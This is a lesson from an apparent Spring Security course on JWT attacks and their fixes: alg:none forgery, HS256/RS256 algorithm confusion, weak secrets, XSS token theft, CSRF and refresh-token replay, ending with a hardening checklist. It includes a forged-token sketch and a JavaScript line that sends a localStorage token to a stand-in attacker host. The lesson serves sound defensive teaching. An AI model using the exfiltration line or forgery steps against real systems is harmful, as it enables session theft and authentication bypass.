---
title: JWT Security — The Attacks and the Fixes
module: spring-security-jwt-deep
order: 5
minutes: 27
topics: ["alg confusion", "secret management", "token theft", "XSS", "CSRF", "hardening"]
docs:
  - title: "JSON Web Token attacks (OWASP)"
    url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_for_JSON_Web_Tokens"
summary: A JWT's trust model rests on one assumption: only the server can produce a valid signature. Every JWT vulnerability is ultimately a way to violate ...
---

# JWT Security — The Attacks and the Fixes

## The Concept: The Token Is Only as Safe as Its Verification

A JWT's trust model rests on one assumption: **only the server can produce a valid signature**. Every JWT vulnerability is ultimately a way to violate that assumption — forging a token, downgrading the algorithm, or stealing a valid one. This lesson walks through the real attack classes, why they work, and the concrete fixes.

## Attack 1 — The `alg: none` Forgery

```json
// Attacker crafts a token with no signature:
{ "alg": "none", "typ": "JWT" } . { "sub": "admin", "role": "ADMIN" } .
// (empty signature)
```

**Why it works (in vulnerable servers):** a verifier that reads `alg` from the *header* and switches verification logic accordingly may accept `none` — skipping signature verification entirely. The attacker just changes `sub` to `admin` and the server believes it.

**The fix:**

```java
// Pin the algorithm/key — never trust the header's alg:
Jwts.parser()
        .verifyWith(hmacKey)          // jjwt: key-pinned => alg fixed, 'none' rejected
        .build()
        .parseSignedClaims(token);
```

Modern libraries reject `none` by default *when you verify with a key*. The rule: **verification behavior must never be decided by attacker-controlled data** (the header). The key pins everything.

## Attack 2 — Algorithm Confusion (HS256/RS256 Mix-Up)

The server expects **RS256** (asymmetric: private key signs, public key verifies). The attacker:

1. Grabs the server's **public** key (it's public — often in a JWKS endpoint).
2. Crafts a token with `"alg": "HS256"` (symmetric — one secret signs and verifies).
3. Signs it with the **public key as the HMAC secret**.
4. If the server verifies HS256 tokens using "the key" (and that key happens to be the public key) — the forgery validates.

**The fix:** a library that ties the algorithm to the key type and *refuses to switch*:

```java
// jjwt: the key type determines the algorithm family; you cannot
// "reuse" an RSA public key as an HMAC secret for verification.
.verifyWith(publicKey)     // only RS256/ES256-style signatures accepted
```

Also: never accept `alg` values you didn't configure; and if you support multiple algorithms, keep them explicitly separated.

## Attack 3 — Weak Secrets

```java
// Vulnerable: a guessable HMAC secret
@Value("${app.jwt.secret}") String secret;   // e.g., "password" or "secret123"
```

With a weak secret, the attacker brute-forces it offline (HMAC is fast — millions of guesses/sec) and then forges any token.

**The fixes:**

- Generate a **cryptographically random secret** of at least 32 bytes (256 bits) for HS256:

```bash
openssl rand -base64 48
# 9wL5... (48 random bytes, base64-encoded)
```

- Store it in the **environment / secret manager**, never in code or committed files.
- Rotate it when leaked; invalidate all tokens at rotation (they'll fail signature check).
- For multi-service systems, prefer **RS256** (private key signs; services verify with the public key, which can be rotated independently).

## Attack 4 — Token Theft via XSS

```javascript
// Attacker injects JS (XSS) that reads the token:
fetch('/api/user').then(r => r.json())
  .then(u => fetch('https://evil.example.com/steal?token=' + localStorage.getItem('token')));
```

If tokens live in `localStorage`/`sessionStorage`, **any** XSS (a comment field, a bad library, a third-party script) hands them over. The browser's security boundary (JS can't read HttpOnly cookies) is the defense.

**The fixes:**

- Keep the **refresh token in an HttpOnly, Secure, SameSite cookie** — JavaScript literally cannot read it.
- Keep the **access token in memory** (module-level variable), re-issued on refresh.
- Fix XSS at the source: escape output, sanitize input, `Content-Security-Policy` headers.

## Attack 5 — CSRF on Cookie-Borne Calls

If the access token also rides a cookie (automatic with requests), a malicious site can trigger cross-site requests that *carry* the cookie — the **CSRF** attack. If the token is only sent via an `Authorization` header (not a cookie), CSRF doesn't apply (the attacker can't set the header cross-origin).

**The fixes:**

- Token-in-header for access; keep cookies only for the refresh flow.
- If cookies carry auth, use CSRF tokens (`CsrfToken` in Spring Security) and `SameSite=Strict/Lax` cookies.
- `SameSite=Lax` already blocks most cross-site sends for modern browsers.

## Attack 6 — Replay and Theft of Refresh Tokens

A stolen refresh token (from a log, a proxy, a leak) lets the attacker mint access tokens. Rotation (previous lesson) is the core defense; **reuse detection** turns theft into an alarm:

```java
// If the same refresh token is presented TWICE, rotation means the second
// use is already invalid — that's the theft signal:
if (repository.findByToken(value).isEmpty()
        && recentlyRevoked.contains(value)) {
    revokeAllForUser(attackerGuess);     // kill the whole session family
    alertSecurity("refresh token reuse detected");
}
```

## The Hardening Checklist

- [ ] Algorithm pinned via key (`verifyWith`), `alg: none` rejected.
- [ ] No algorithm switching based on header content.
- [ ] HS256 secret ≥ 256 random bits, from env/secret manager, rotated on leak.
- [ ] Access tokens short-lived (5–15 min); refresh tokens rotated on every use.
- [ ] Refresh token in HttpOnly+Secure+SameSite cookie; access token in memory.
- [ ] `iss`/`aud` claims required.
- [ ] Expiry always set and checked.
- [ ] Logout revokes server-side (deletes refresh token).
- [ ] XSS defenses: CSP, output escaping, no secrets in storage readable by JS.
- [ ] CSRF handled (SameSite cookies / CSRF tokens) where cookies carry auth.
- [ ] Rate-limit auth endpoints; monitor refresh-token reuse.

## Common Beginner Pitfalls

1. **Hand-rolling JWT parsing** — base64url-decode + manual HMAC + manual expiry check is exactly where the `alg: none` and expiry bugs live. Use a maintained library.
2. **`alg` from the header driving verification** — attacker-controlled logic. Pin the key.
3. **Long-lived access tokens** — every minute of access-token life is a minute of stolen-access exposure.
4. **No `exp`** — permanent tokens.
5. **Tokens in `localStorage`** — XSS exfiltrates the session.
6. **No reuse detection** — silent session theft continues unnoticed.
7. **Secrets in the repo** — even "temporarily"; Git history keeps them forever.

## Key Takeaways

- All JWT attacks violate "only the server can sign" — forgery, downgrade, or theft.
- Pin the algorithm via the key (`verifyWith`); never trust the header's `alg`.
- Weak/leaked secrets = total forgery. Use 256+ random bits from env, rotate on leak.
- Theft defenses: HttpOnly cookies for refresh, in-memory access tokens, short lifetimes.
- Rotation + reuse detection make refresh-token theft a loud, detectable event.
- Use a maintained JWT library; hand-rolling is where the bugs live.
- The complete hardening checklist above is the production baseline.
